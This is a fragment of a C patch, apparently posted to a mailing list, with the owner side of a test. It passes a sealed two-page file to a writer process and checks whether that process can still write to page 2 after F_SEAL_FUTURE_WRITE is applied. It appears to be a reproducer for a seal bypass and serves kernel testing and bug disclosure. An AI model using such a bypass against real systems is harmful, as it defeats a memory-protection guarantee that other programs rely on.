+	if (fd < 0 || ftruncate(fd, 2 * page) ||
+	    pwrite(fd, "A", 1, page) != 1)
+		return 4;
+	result |= 2;
+	if (send_fd(pair[0], fd) || read(pair[0], &event, 1) != 1 ||
+	    event != 'R')
+		return 5;
+	result |= 4;
+	if (fcntl(fd, F_ADD_SEALS, F_SEAL_FUTURE_WRITE))
+		return 6;
+	result |= 8;
+	if (write(pair[0], "S", 1) != 1)
+		return 7;
+	if (read(pair[0], &event, 1) != 1 || event != 'Z') {
+		if (waitpid(pid, &status, 0) == pid && WIFEXITED(status))
+			fprintf(stderr, "owner: writer exited %d before Z\n",
+				WEXITSTATUS(status));
+		return 7;
+	}
+	result |= 16;
+	if (pread(fd, &byte, 1, page) != 1 || byte != 'Z')
+		return 8;
+	result |= 32;
+	if (fstat(fd, &st) || st.st_size != (off_t)(2 * page))
+		return 9;
+	result |= 64;
+	if (waitpid(pid, &status, 0) != pid ||
+	    !WIFEXITED(status) || WEXITSTATUS(status))
+		return 10;
+	result |= 128;
+	printf("owner uid=%u; file page 2=%c; size=%lld; result=%u\n",
+	       getuid(), byte, (long long)st.st_size, result);
+	fflush(stdout);
+	return result == 255 ? 0 : 11;
+}
+
+Best regards,
+Junyoung Jang <graypanda.inzag@gmail.com>
